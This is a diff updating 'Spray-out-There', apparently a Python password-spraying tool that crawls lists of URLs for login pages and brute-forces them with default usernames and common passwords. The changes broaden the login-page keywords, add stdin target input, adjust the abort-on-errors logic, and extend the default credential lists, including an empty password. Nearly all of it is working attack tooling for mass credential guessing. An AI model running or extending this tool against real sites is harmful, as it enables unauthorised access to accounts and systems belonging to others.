@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 #
 # Spray-out-There
-# Version: 0.3.3
+# Version: 0.3.4
 
 import argparse
 import concurrent.futures
@@ -13,6 +13,7 @@ import urllib3
 from bs4 import BeautifulSoup
 from enum import Enum
 from os import path
+from sys import stdin
 from time import sleep
 from urllib.parse import urlparse, urljoin
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@@ -22,7 +23,8 @@ class Login(object):
 
     HTTP_TIMEOUT = 15
     HTTP_UA = { 'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0" }
-    LOGIN_PAGES = ['login','signin','admin','dashboard','panel','index.']
+    LOGIN_PAGES = ['account','adm','area','auth','conf','control','dashboard',
+                   'home','index.','login','member','panel','user','web']
 
     class AuthType(str, Enum):
         BASIC_AUTH = 'BASIC AUTH'
@@ -101,8 +103,8 @@ class LoginBA(Login):
 class LoginForm(Login):
 
     USER_FIELDS = ['user','mail','login','usuario']
-    LOGIN_FAIL = ['invalid login','authentication failed','password incorrect','access denied',
-                  'error!','incorrect','invalid','failed','denied']
+    LOGIN_FAIL = ['invalid login','invalid password','authentication failed','password incorrect',
+                  'access denied','error!','incorrect','invalid','failed','denied']
 
     def __init__(self, url: str, auto=True):
         super().__init__(url)
@@ -132,7 +134,7 @@ class LoginForm(Login):
             r = requests.get(self.url, timeout=Login.HTTP_TIMEOUT, verify=False, headers=Login.HTTP_UA)
         except:
             return False
-        if r.status_code != 200 or 'text/html' not in r.headers['Content-Type']:
+        if r.status_code != 200 or 'Content-Type' not in r.headers or 'text/html' not in r.headers['Content-Type']:
             return False
         self.__findLogin(r)
 
@@ -285,7 +287,7 @@ class Brute(object):
                     self.bad_value = option['value']
 
     def Start(self, threads=8):
-        print('  bruteforce:', self.login_url)
+        print('  bruteforcing:', self.login_url)
         workers = []
         with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as pool:
             for password in self.pass_list:
@@ -296,10 +298,12 @@ class Brute(object):
                 if worker.result():
                     if self.__reverify():
                         pool.shutdown(wait=False)
-                        return (self.login_url, self.creds)
+                        return (self.ref_url, self.creds)
+                    if self.errors > Brute.MAX_ERRORS:
+                        pool.shutdown(wait=False)
+                        print('  * Aborted. Too many errors:', self.login_url)
+                        return False
 
-        if self.errors > Brute.MAX_ERRORS:
-            print('  * Aborted. Too many errors:', self.login_url)
         return False
 
     def CheckCreds(self, username: str, password: str, threading: bool) -> bool:
@@ -425,7 +429,8 @@ class Brute(object):
 if __name__ == "__main__":
     print('\n  --  Spray Out There  --  \n')
     parser = argparse.ArgumentParser(description='Spray Out There')
-    parser.add_argument('input', type=str, nargs='+', help='file or url')
+    parser.add_argument('input', type=str, nargs='?', help='file or url')
+    parser.add_argument('stdin', nargs='?', type=argparse.FileType('r'), default=stdin)
     parser.add_argument('-u', metavar='user', type=str, help='user')
     parser.add_argument('-p', metavar='pass', type=str, help='password')
     parser.add_argument('-U', metavar='file', type=str, help='user file')
@@ -434,11 +439,16 @@ if __name__ == "__main__":
     parser.add_argument('--filter', type=str, default='auto', choices=['auto', 'yes', 'no'], help='Filter urls for certain keywords before logins search')
     args = parser.parse_args()
 
-    if args.input[0].startswith('http'):
-        targets = [args.input[0].strip()]
-    elif path.exists(args.input[0]):
-        targets = Login.LoadUrlsFile(args.input[0], args.filter)
-    else:
+    targets = []
+    if not stdin.isatty():
+        targets = args.stdin.read().splitlines()
+    elif args.input:
+        if path.exists(args.input):
+            targets = Login.LoadUrlsFile(args.input, args.filter)
+        elif args.input.startswith('http'):
+            targets = [args.input.strip()]
+
+    if not targets:
         print('> Invalid input, use url or list file')
         quit()
 
@@ -448,7 +458,7 @@ if __name__ == "__main__":
         with open(args.U, 'r') as file:
             users = file.read().splitlines()
     else:
-        users = ['admin','root','1234','adm','administrator','demo','guest','info','test']
+        users = ['admin','root','1234','adm','administrator','demo','guest','user','operator','info','test']
 
     if args.p:
         passwords = [args.p]
@@ -456,9 +466,9 @@ if __name__ == "__main__":
         with open(args.P, 'r') as file:
             passwords = file.read().splitlines()
     else:
-        passwords = ['admin','test','123456','123456789','qwerty','password','1111111','123',
-                     '12345678','abc123','1234567','password1','12345','1234567890','123123',
-                     '000000','Iloveyou','1234','1q2w3e4r5t','Qwertyuiop','Monkey','Dragon']
+        passwords = ['admin','','test','123456','123456789','letmein','qwerty','password','1111111','123',
+                     '12345678','abc123','1234567','password1','12345','1234567890','123123','default','demo',
+                     '000000','Iloveyou','1234','1q2w3e4r5t','Qwertyuiop','Monkey','Dragon','guest']
 
     print('> %s urls' % len(targets))
     print('> Searching logins ...')
@@ -486,7 +496,7 @@ if __name__ == "__main__":
             json.dump([vars(l) for l in logins], file, sort_keys=True, indent=4)
 
     brutes = [Brute(users, passwords, login) for login in logins if login.bad_logins]
-    print('> Bruteforcing %s logins ...' % len(brutes))
+    print('> %s valid candidates' % len(brutes))
     creds = []
     with concurrent.futures.ThreadPoolExecutor(max_workers=10) as pool:
         workers = [pool.submit(brute.Start) for brute in brutes]
